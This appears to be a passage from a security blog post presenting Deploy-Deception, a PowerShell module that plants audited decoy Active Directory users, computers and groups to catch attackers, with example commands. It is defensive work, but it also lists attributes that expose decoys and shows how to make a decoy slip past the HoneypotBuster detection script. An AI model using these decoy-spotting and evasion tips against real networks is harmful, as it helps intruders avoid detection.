<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmm-lRbRq6OsM46ZjBgihre7Fs6zbsJWSrHtS-Eeln4SAM1ncSg0VvHdaclrySKZyvBMUTbkt7I_dPMFENPyi-Tz9MPxmAb6AFrAaVmUsXsX9t1YAkaUTdGrYx53TCRNkS4ZHJUKFM308/s1600/DS_Access_GP.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img alt="AD Access Group Policy" border="0" data-original-height="631" data-original-width="840" height="300" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmm-lRbRq6OsM46ZjBgihre7Fs6zbsJWSrHtS-Eeln4SAM1ncSg0VvHdaclrySKZyvBMUTbkt7I_dPMFENPyi-Tz9MPxmAb6AFrAaVmUsXsX9t1YAkaUTdGrYx53TCRNkS4ZHJUKFM308/s400/DS_Access_GP.png" title="AD Access Group Policy" width="400" /></a></div>Above setting results in a Security Event 4662 whenever an AD object is accessed. The logging needs to configured at the object level. For that configuration, we need to modify the SACL of the object and add relevant ACEs.<br />
<br />
Let's have a look at the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-addauditaccessobjectace">AddAuditAccessObjectAce</a> function to understand ACE:<br />
<br />
<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDaiLE2ZeUWZpxakHuCT06yF2KvdeKJvR23nuq5ejSQhx_l0HIOq-8oMF6gPHktC3r48bm5C4tQ65rPAk2VuxIfVi63lYLyBq8sNA1P6pLcDNqE-VaKwqSrS5KYGrXYnKctaqreoiThLo/s1600/ACE.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="583" data-original-width="1569" height="235" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDaiLE2ZeUWZpxakHuCT06yF2KvdeKJvR23nuq5ejSQhx_l0HIOq-8oMF6gPHktC3r48bm5C4tQ65rPAk2VuxIfVi63lYLyBq8sNA1P6pLcDNqE-VaKwqSrS5KYGrXYnKctaqreoiThLo/s640/ACE.png" width="540" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div>So, as an example, we can set auditing whenever 'everyone' uses 'ReadProperty' 'success'-fully against a user. This helps in detecting any enumeration against that user.<br />
<br />
<h4>Introducing Deploy-Deception </h4>These settings can be done using GUI. But thanks to PowerShell and the ActiveDirectory module, it can be automated.<br />
<br />
To automate the setting up of decoy object with interesting attributes and lesser known properties to avoid false positives , I wrote <b>Deploy-Deception</b>. It is a PowerShell module which utilizes the ActiveDirectory module to deploy decoys easily and efficiently. You can find Deploy-Deception on Github here: <a href="https://github.com/samratashok/Deploy-Deception">https://github.com/samratashok/Deploy-Deception</a><br />
<br />
<br />
Let's have a look at setting up of different types of object decoys during different phases of an attack.<br />
<br />
<h4>Enumeration - Decoy User Objects</h4>User objects are the most interesting objects&nbsp; Some user properties are of interest for an attacker:<br />
<ul><li>Password does not expire</li>
<li>Trusted for Delegation </li>
<li>Users with SPN</li>
<li>Password in description</li>
<li>Users who are members of high privilege groups</li>
<li>Users with ACL rights over other users, groups or containers </li>
</ul>We can use Deplou-UserDeception function to create a decoy user. <br />
Let's create a decoy user 'usermanager' whose password never expires and a 4662 is logged whenever everyone reads any of its properties:<br />
<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">PS C:\> Import-Module C:\Deploy-Deception\Deploy-Deception.psd1
PS C:\> Create-DecoyUser -UserFirstName user -UserLastName manager -Password Pass@123 | Deploy-UserDeception -UserFlag PasswordNeverExpires -Verbose
</textarea></pre><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8fzK1_L9a5Lm7Ew10a5z7y7lcE0PT3WOKe-Nbo5W6wglxsvYh95su_OQBXF7siYKW0RFeF312Zzbk4qqgYkSys-D2ku2XqV8k_2Xiddq_QBkd7hrmIdOTBkKGOVshD8vpt64vGTYjUBg/s1600/user_readall.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="382" data-original-width="1600" height="95" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8fzK1_L9a5Lm7Ew10a5z7y7lcE0PT3WOKe-Nbo5W6wglxsvYh95su_OQBXF7siYKW0RFeF312Zzbk4qqgYkSys-D2ku2XqV8k_2Xiddq_QBkd7hrmIdOTBkKGOVshD8vpt64vGTYjUBg/s400/user_readall.png" width="400" /></a></div><br />
Please note that an actual user objects is created in the domain. Now, the above gets triggered very frequently as we have enabled the default logging for whenever anyone reads any property of the user usermanager. It means a 4662 will be logged even if someone simply lists all the users in the domain. This means, that this decoy will trigger logging for all the possible usage (normal or otherwise) like<br />
<br />
net user /domain<br />
<br />
Get-WmiObject -Class Win32_UserAccount<br />
<br />
Get-ADUser -Filter * (MS ActiveDirectory module)<br />
<br />
Get-NetUser (PowerView)<br />
<br />
Find Users, Contacts and Groups GUI <br />
<br />
That does not look good, right? So we need to find ways to differentiate attacker enumeration from normal activity. There is something very interesting with attacker enumeration tools, they like to extract as much information for an object as possible (which makes sense as you would not like to connect repeatedly to a domain controller). Now, this means that if we turn on auditing for an uncommon attribute, there is a large possibility (yes, possibility - share your false positives with me please :P) that only aggressive enumeration triggers the logging. There are many such attributes, have a look at the <a href="https://docs.microsoft.com/en-us/windows/desktop/adschema/attributes-all">List of All Attributes.</a> I liked once such attribute - <a href="https://docs.microsoft.com/en-us/windows/desktop/adschema/a-x500uniqueidentifier">x500uniqueIdentifier</a> (GUID d07da11f-8a3d-42b6-b0aa-76c962be719a)<br />
<br />
So, we now remove the ACE we added previously and add a new one which triggers logging only when x500uniqueIdentifier property is read:<br />
<pre><textarea cols="70" readonly="readonly" rows="4" style="background-color: #012456; color: white;">PS C:\> Deploy-UserDeception -DecoySamAccountName usermanager -RemoveAuditing $true -Verbose
PS C:\> Deploy-UserDeception -DecoySamAccountName usermanager -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose
</textarea></pre>This auditing is triggered only by tools like PowerView (or other tools like ADExplorer) which fetches all the attributes of an object. While not perfect, this is a huge improvement. <br />
<br />
If you have enough confidence that none of your monitoring or management tools read all the properties of a user object, auditing for properties like SPN can also be set which triggers logging only when SPN (or all attributes) is read. <br />
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser -UserFirstName user -UserLastName manager-spn -Password Pass@123 | Deploy-UserDeception -SPN 'MSSQLSvc/dc' -GUID f3a64788-5306-11d1-a9c5-0000f80367c1 -Verbose 
</textarea></pre>Still too many logs? The below command logs a 4662 log only when DACL (or all attributes) of the decoy user object is read:<br />
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser -UserFirstName user -UserLastName manager-control -Password Pass@123 | Deploy-UserDeception -UserFlag AllowReversiblePasswordEncryption -Right ReadControl -Verbose 
</textarea></pre><h4>Enumeration - Decoy Computer Objects</h4>We can also set decoy computer objects. It is possible to create computer objects in domain without having an actual computer mapped to that object. Although, it is always advised to use actual computers or VM for decoy computer objects to avoid identification of decoys.<br />
<br />
Some computer object properties which are of interest to an adversary:<br />
<ul><li>Older Operating Systems</li>
<li>Interesting SPN</li>
<li>Delegation Settings</li>
<li>Membership of privileged groups</li>
</ul>Let's have a look at some deployment using Deploy-Deception, we can use Deploy-DecoyComputer function. :<br />
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Create-DecoyComputer -ComputerName revert-web -Verbose | Deploy-ComputerDeception -PropertyFlag TrustedForDelegation -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a  -Verbose 
</textarea></pre>Above command creates a decoy computer that has Unconstrained Delegation enabled and a 4662 is logged whenever x500uniqueIdentifier or all the attributes of the computer are read.<br />
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Deploy-ComputerDeception -DecoyComputerName comp1 -PropertyFlag TrustedForDelegation -Right ReadControl -Verbose 
</textarea></pre>Above command uses an existing computer object and sets Unconstrained Delegation. Logging is triggered whenever DACL or all the attributes of the computer are read.<br />
<br />
We can also use <a href="https://www.dcshadow.com/">DCShadow</a> to modify a computer object which appears to be a DC. I briefly touched on this <a href="https://www.labofapenetrationtester.com/2018/04/dcshadow.html">here</a>. More on this particular topic some other day.<br />
<br />
<h4>Enumeration - Decoy Group Objects</h4>We can also deploy decoy Group objects. What properties of a group are interesting to an adversary?<br />
<ul><li>Interesting name (containing words like admins, administrators etc.) </li>
<li>Members of the group are also member of high privileged groups or have 'interesting' user attributes.&nbsp;</li>
<li>Membership of a high privilege group. </li>
</ul><br />
Groups provide interesting opportunities. We can make decoy users member of a decoy group thus creating 'layered' decoys. This way we get logs both when membership of the decoy group is listed and when attributes of the decoy user are listed. We will see soon how to use Logon restrictions to avoid mis-use of privileges of a user.<br />
<br />
So in the below command, we create a decoy user 'dnsmanager' whose password never expires with logging when an obscure property is read, create a group with name 'Forest Admins', make dnsmanager part of the forest admins group and add the forest admins group to the built-in dnsadmins group. Logging is triggered when membership of the group is read. We can use Deploy-GroupDeception for this:<br />
<pre><textarea cols="70" readonly="readonly" rows="7" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser -UserFirstName dns -UserLastName manager -Password Pass@123 | Deploy-UserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose 

PS C:\> Create-DecoyGroup -GroupName 'Forest Admins' -Verbose | Deploy-GroupDeception -AddMembers dnsmanager -AddToGroup dnsadmins -GUID bc0ac240-79a9-11d0-9020-00c04fc2d4cf -Verbose 
</textarea></pre><br />
<h4>Enumeration and Lateral Movement - Privileged Decoy User Objects</h4>We can also deploy high privilege user decoys to target both enumeration and lateral movement. We can create decoy users which have high privileges like membership of domain admins, rights to execute DCSync etc.<br />
<br />
Now, the risk with having decoy users with such high privileges is if such a user gets compromised, its privileges can be abused. To avoid that,&nbsp; we can use couple of protections:<br />
<ul><li>Set the Logon Workstation to a non-existent machine</li>
<li>Deny logon to the user. </li>
</ul>In both the above cases, AFAIK, user privileges cannot be used as the decoy user cannot logon to any box with any type of credential like password, hash etc.<br />
<br />
Armed with this knowledge, let's create high privilege user decoys using Deploy-PrivilegedUserDeception :<br />
<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser  -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection DenyLogon -Right ReadControl -Verbose 
</textarea></pre><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOzIqM9APuIyzku_jUaHrmTHmJyiDTc5mGAbSU5nNTr3OMQekyRLhf7ixL9OHK_m-Y0xaZd7Kyt3dOpHGqxBL8MTnlzGIuRAvaq-dCZqT5VY1B2yKfvCqaRbD5dc1M6_zPUKbuKqtjL5Q/s1600/privilege_userdeception.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="395" data-original-width="1600" height="97" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOzIqM9APuIyzku_jUaHrmTHmJyiDTc5mGAbSU5nNTr3OMQekyRLhf7ixL9OHK_m-Y0xaZd7Kyt3dOpHGqxBL8MTnlzGIuRAvaq-dCZqT5VY1B2yKfvCqaRbD5dc1M6_zPUKbuKqtjL5Q/s400/privilege_userdeception.png" width="400" /></a></div>The above command creates a user called 'decda' who is a part of the Domain Admins but cannot logon to any machine. Any attempt to list DACL of the user or list all attributes results in a 4662 log.<br />
<br />
For the lateral movement part, we have used the DenyLogon protection. That means even if the user's password or hash or keys are compromised, it will not be possible to reuse those credentials. To get meaningful logs when credentials of such a user are used, we must enable the following Group Policy:<br />
Configuration|Windows Settings|Security Settings|Advanced Audit Policy Configuration|Audit Policies|Account Logon | Audit Kerberos Authentication Service | Failure<br />
<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1r17dbvHXozw25l7sxfRKw8Kv2wb5idA1e4UqFEDTFpVoRSTSBhWDFXGMtlHlRBppfTHUf_FT_zeiDetb275fsKv-skA6jClXeLDc4KaNXJKPpWEUGbQz7Q_QIh3bYzPugdOT2ITpK5g/s1600/GP_Kerberos.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="615" data-original-width="1031" height="237" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1r17dbvHXozw25l7sxfRKw8Kv2wb5idA1e4UqFEDTFpVoRSTSBhWDFXGMtlHlRBppfTHUf_FT_zeiDetb275fsKv-skA6jClXeLDc4KaNXJKPpWEUGbQz7Q_QIh3bYzPugdOT2ITpK5g/s400/GP_Kerberos.png" width="400" /></a></div>This is how the failure looks like in GUI.<br />
<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKjwMYmMzkE0aCnRE2fEjsRQTf2Ev5uVx_p2xccJKZCaS0hiGRTAQvRXfJyX6vnuQYwFl9t0odPhrzWcwx1K8CdLC75H6wrZDGg7V9ZkXBZ4H8dT-8qg7LRt2CrWJNwX-aZafVye0OEIo/s1600/Faliure.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="511" data-original-width="569" height="286" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKjwMYmMzkE0aCnRE2fEjsRQTf2Ev5uVx_p2xccJKZCaS0hiGRTAQvRXfJyX6vnuQYwFl9t0odPhrzWcwx1K8CdLC75H6wrZDGg7V9ZkXBZ4H8dT-8qg7LRt2CrWJNwX-aZafVye0OEIo/s320/Faliure.png" width="320" /></a></div>And a 4768 (Failure) is logged on the Domain Controller. In case of attacks like OverPass-The-Hash no such verbose error is returned.<br />
<br />
Another option is to set LogonWorkstation to a nonexistent machine. It always makes sense to use a name similar for the workstation that is similar to your actual machines. <br />
<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser  -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception-Technique DCSyncRights -Protection LogonWorkStation revert-webserver1 -Right ReadControl -Verbose
</textarea></pre>Above command creates a decoy user call 'decda', provides it with DCSync permissions and sets the LogonWorkStation to a non-existent machine. If the users credentials are compromised and re-used the error would exactly be the same as in case of DenyLogon and a 4768 is logged.<br />
<br />
Both the protections can be used with a non-DA account as well. IMHO, this is better than leaving wrong passwords or hashes in memory (which is a well known technique).<br />
<br />
This technique can always be coupled with others. For example,when targeting lateral movement, one of the easier ways to let an adversary 'retrieve' credentials for a decoy user is to use the -PasswordInDescription option of Deploy-UserDeception. Then, we can make that user a privileged user and use one of the protections discussed above:<br />
<pre><textarea cols="70" readonly="readonly" rows="6" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser  -UserFirstName new -UserLastName da -Password Pass@123 | Deploy-UserDeception -PasswordInDescription 'The new password is Pass@123' -Verbose

PS C:\> Deploy-PrivilegedUserDeception -DecoySamAccountName newda -Technique DomainAdminsMemebership -Protection DenyLogon -Right ReadControl -Verbose
</textarea></pre></div><div style="text-align: justify;">The first command above creates a newuser called 'newda', sets the string 'The new password is Pass@123' as its description. The second command makes newda a member of the domain admins group, denies logon to the user and configures auditing whenever DACL or all attributes of newda are read.<br />
<br />
No special tools are required to get the password from description! Remember targeting 'go for the lowest hanging fruit' ;)<br />
<br />
While discussing users with privileges, there is another important aspect that must be discussed. It is about ACLs. A user which have interesting permissions over another user is always of interest to an attacker. (Side note: Make sure that you ACL auditing is a part of your security methodology - both for <a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">domain objects</a> and <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1">other</a> <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">securables</a>).<br />
<br />
We can use Deploy-SlaveDeception to deploy decoy users where one of the users have FullControl/GenericAll rights over other user. This is interesting for an attacker and can be used to target both enumeration and lateral movement phase. <br />
<br />
To target enumeration, following can be used:<br />
<pre><textarea cols="70" readonly="readonly" rows="9" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser -UserFirstName master -UserLastName user -Password Pass@123 | Deploy-UserDeception -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose

PS C:\> Create-DecoyUser -UserFirstName slave -UserLastName user -Password Pass@123 | Deploy-UserDeception -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose

PS C:\> Deploy-SlaveDeception -SlaveSamAccountName slaveuser -DecoySamAccountName masteruser -Verbose 
</textarea></pre>The first and second command above, create users masteruser and slaveuser respectively and set auditing only when an obscure attribute is read. The third command provides masteruser GenericAll rights over slaveuser. Any adversary enumerating or scanning interesting ACLs in your domain will trigger 4662 for both the objects. <br />
<br />
<br />
To target lateral movement, we can use PasswordInDescription option for masteruser or leave its credentials using other popular methods without any protection. We are ready to risk masteruser to be compromised and used (Please carefully consider risks before doing that). If masteruser modifies DACL of slaveuser we get a 4662 log in addition to any other alerts that are triggered whenever a honeytoken/honeyuser is used: <br />
<pre><textarea cols="70" readonly="readonly" rows="10" style="background-color: #012456; color: white;"> PS C:\> Create-DecoyUser -UserFirstName master -UserLastName user -Password Pass@123

PS C:\> Create-DecoyUser -UserFirstName slave -UserLastName user -Password Pass@123

PS C:\> Deploy-SlaveDeception -SlaveSamAccountName slaveuser -DecoySamAccountName masteruser -Verbose

PS C:\> Deploy-UserDeception -DecoySamAccountName slaveuser -Principal masteruser -Right WriteDacl -Verbose 
</textarea></pre>In the above command, a 4662 is logged only when masteruser changes DACL of slaveuser.<br />
<br />
<h4>Enumeration - Domain and Forest Trust objects</h4>Yet to be automated! There are many interesting possibilities though! For example, we can have a decoy forest trust (let's call it blue forest :P) where we can allow enumeration of users, computers and groups but deny access to any other resource. This can be achieved by setting up a forest trust with Selective Authentication where "Allowed to Authenticate" is set only on the DC but no other machine. This will allow an adversary to enumerate objects but they cannot access resources on other computers.<br />
<br />
<h4></h4><h4>Red Team Revenge - Identifying Deception</h4>So how do red teams identify which objects are actual and which are traps or decoys? As I mentioned in the beginning of the post, I have tested multiple Deception solutions over past months. There are multiple Enterprise solutions that use objects which can be identified by looking at their attributes. Some of such attributes:<br />
<br />
<ul><li><b>objectSID </b>- This object must always have DomainSID-RID format. Some enterprise solutions mess that up. If you find an object whose SID does not contain the domain SID. Make sure you investigate that object carefully. </li>
<li><b>lastLogon, lastlogontimestamp </b>- User decoys can be identified by looking at these attributes. If there is a user that too high privileged one who has never logged on (lastLogon set to 31/12/1600 which is before the 'zero' date for LargeInteger datetime), there are good chances that it is a decoy.&nbsp; </li>
<li><b>logonCount</b> - Although not as good as lastLogon, logonCount is also a good indicator.</li>
<li><b>whenCreated</b> - Coupled with lastLogon and logonCount, this becomes a good indicator. A user which is old but has never logged-on could be a decoy. You may like to notice that it may also be a dormant user, to be sure have a look at other attributes. </li>
<li><b>badPwdCount,badPasswordTime</b> - Ever seen a human user who will not fat-finger their password? A user with 0 Badpwdcount (and other bad password attributes) is a good indicator of a decoy.&nbsp;</li>
<li><b>Too many attributes </b>- Some enterprise solutions fill up ALL or way too many possible attributes for an object. This can also be easily spotted.&nbsp;</li>
</ul>The best way is to match an object with a well known 'good' object. For example, if you suspect that a computer object in a list of all computers in the domain is a decoy compare it with the properties of the domain controller or attributes of your own foothold machine. The actual dc is always listed in the logonserver environment variable. For user object, the built-in DA always has RID 500. Compare its attributes with a user object you suspect of being decoy.<br />
<br />
For multiple solutions which relied on not creating actual objects in the domain, using WMI to retrieve domain information shows correct objects and not the fake ones. <br />
<br />
<h4>Red Team Revenge - Avoiding Deception</h4>(Taken directly from my slides) Red Teams need to change their approach and their psychology of illusive superiority to avoid deception:<br />
<ul><li>Please stop going for the lowest hanging fruit. Enterprise networks are mess but if something looks to good to be true, investigate carefully!</li>
<li>Avoid automated enumeration tools unless you absolutely know what they are doing in the background. </li>
<li>I have been urging this in my talks (on ATA) and trainings - Avoid the urge to go for the DA privileges so that you can brag about it in the reports! Focus on goals of your operation. </li>
</ul><h4>Blue Teams - Avoiding identification</h4>If actual domain objects are used chances of identification are decreased. For example, a computer object which is not mapped to an actual computer has much higher chances of getting identified.<br />
<br />
For user decoys, as discussed earlier, having at least one logon session decreases the chances of identification. Let's test this one out.<br />
<br />
Let's have a look at a simple example. There is a well known deception identification script called <a href="https://github.com/JavelinNetworks/HoneypotBuster">HoneypotBuster</a>. Let's create a decoy DA and run the script:<br />
<br />
<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvMS44QkQugfVMOAVjNkwSsIfDI9A_t_G6KNKrssnSnBOp0GuvYsNaAKB2Uehms5h4Z0vgr2Eggw8EOdyFu6uB9R17hvogm_TtbgZ31WtMZwgNKs9X3rFR9CwUp9jSNCfLoOT4-INZEjY/s1600/honeypotbuster-detection.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="631" data-original-width="1181" height="212" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvMS44QkQugfVMOAVjNkwSsIfDI9A_t_G6KNKrssnSnBOp0GuvYsNaAKB2Uehms5h4Z0vgr2Eggw8EOdyFu6uB9R17hvogm_TtbgZ31WtMZwgNKs9X3rFR9CwUp9jSNCfLoOT4-INZEjY/s400/honeypotbuster-detection.png" width="400" /></a></div>Our decoy DA was detected. Deploy-PrivilegedUserDeception has an option 'CreateLogon'. This parameter starts and stops calculator on the DC with the decoy DA user which populates the logon related properties of the user. To use this parameter, the LogonWorkstation protection must be set to the DC where the module is being executed. You can always change the behavior of the user later.<br />
<pre><textarea cols="70" readonly="readonly" rows="4" style="background-color: #012456; color: white;"> PS C:\> Create-DecoyUser -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection LogonWorkStation -LogonWorkStation revert-dc -CreateLogon -Verbose 
</textarea></pre>The above command creates decda, makes it a member of the Domain Admins group, restricts logon to the DC and creates a logon session (which also creates a profile on the DC). Now, if we run Honeypot Buster<br />
<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCLZBjWGXSi-G0d50WYHEDs1M6ouu845G4go8Sd7rQjEF8nSiiIw_xh9XsQPGXbOZLTGhAiDsRtRJlhXRYKvOr5n04XE-U9v8v-w51Jxy0uE4wrF_2mZ_JelEZW3Icueb7DNYc_VA2_cE/s1600/honeypotbuster-evasion.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="511" data-original-width="1175" height="173" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCLZBjWGXSi-G0d50WYHEDs1M6ouu845G4go8Sd7rQjEF8nSiiIw_xh9XsQPGXbOZLTGhAiDsRtRJlhXRYKvOr5n04XE-U9v8v-w51Jxy0uE4wrF_2mZ_JelEZW3Icueb7DNYc_VA2_cE/s400/honeypotbuster-evasion.png" width="400" /></a></div>Sweet, the FakeRank or confidence of the tool is down to 50. Honeypot buster uses a ranking system for objects and if a user has a logonCount less than 6 there would always be some confidence of it being fake. If we make the logonCount to 6 for decda by starting a process with its credentials 6 times, it would not show up in this tool.<br />
<pre><textarea cols="70" readonly="readonly" rows="4" style="background-color: #012456; color: white;"> PS C:\> Create-DecoyUser -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection LogonWorkStation -LogonWorkStation revert-dc -CreateLogon -logonCount 6 -Verbose 
</textarea></pre><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuC8HIDc_pjlV9Ft_lcoHF2RMWAfL69guAvzi_tbTQdEvPVc8O-V1YO0CAt2gZqXpG-HytY2ayrqvl5mGqtg2pXNYUBy3JZgW4viVfxucrXye5r3aACHKrxI5WVeqOZ2vlAAVTjuGTwhw/s1600/honeypotbuster-evasioncommand.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="260" data-original-width="1600" height="65" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuC8HIDc_pjlV9Ft_lcoHF2RMWAfL69guAvzi_tbTQdEvPVc8O-V1YO0CAt2gZqXpG-HytY2ayrqvl5mGqtg2pXNYUBy3JZgW4viVfxucrXye5r3aACHKrxI5WVeqOZ2vlAAVTjuGTwhw/s400/honeypotbuster-evasioncommand.png" width="400" /></a></div>Now if we run HoneypotBuster, decda is not detected! But that would be targeting this specific tool so let's not read much into this 'bypass'.&nbsp; <br />
<br />
<h4>Future Work and Community Involvement</h4>It would be great if you deploy the decoys in your domain environments and share the results with me. That way, even if you cannot contribute to the code, you will immensely help the project.<br />
<br />
OU objects are just around the corner and should not take much long to be included in the tool. I am also working on automating domain and forest trust decoys.I also have super ambitious plans of using virtualization to deploy decoys forests and computers in real time!<br />
<br />
That is all! Thank you very much for reading this rather long post. You can find slides and video of my talk at BruCON below!<br />
<br />
<iframe allowfullscreen="" center="" frameborder="0" height="485" marginheight="0" marginwidth="0" scrolling="no" src="//www.slideshare.net/slideshow/embed_code/key/910z0g2NGVm7AP" style="border-width: 1px; border: 1px solid #ccc; margin-bottom: 5px; max-width: 100%;" width="595"> </iframe> <br />
<div style="margin-bottom: 5px;"><b> <a href="https://www.slideshare.net/nikhil_mittal/forging-trusts-for-deception-in-active-directory" target="_blank" title="Forging Trusts for Deception in Active Directory">Forging Trusts for Deception in Active Directory</a> </b> from <b><a href="https://www.slideshare.net/nikhil_mittal" target="_blank">Nikhil Mittal</a></b> </div><br />
<br />
<div class="separator" style="clear: both; text-align: center;"><iframe allowfullscreen="" class="YOUTUBE-iframe-video" data-thumbnail-src="https://i.ytimg.com/vi/EEceX5x2JY8/0.jpg" frameborder="0" height="485" src="https://www.youtube.com/embed/EEceX5x2JY8?feature=player_embedded" width="595"></iframe></div><br />
<br />
</div></div>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Posted by
<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
<span itemprop='name'>Nikhil SamratAshok Mittal</span>
</a>
</span>
</span>
<span class='post-timestamp'>
at
<meta content='http://www.labofapenetrationtester.com/2018/10/deploy-deception.html' itemprop='url'/>
<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2018/10/deploy-deception.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2018-10-16T23:13:00+05:30'>11:13&#8239;PM</abbr></a>
</span>
<span class='post-comment-link'>
<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/10/deploy-deception.html#comment-form' onclick=''>
No comments:
  </a>
</span>
<span class='post-icons'>
<span class='item-control blog-admin pid-1005506833'>
<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=8408133389804595546&from=pencil' title='Edit Post'>
<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
</span>
<div class='post-share-buttons goog-inline-block'>
<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8408133389804595546&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
</div>
</div>
<div class='post-footer-line post-footer-line-2'>
<span class='post-labels'>
Labels:
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory' rel='tag'>Active Directory</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams' rel='tag'>Active Directory Attacks for Red and Blue Teams</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Deception' rel='tag'>Active Directory Deception</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Deploy-Deception' rel='tag'>Deploy-Deception</a>
</span>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
</div>

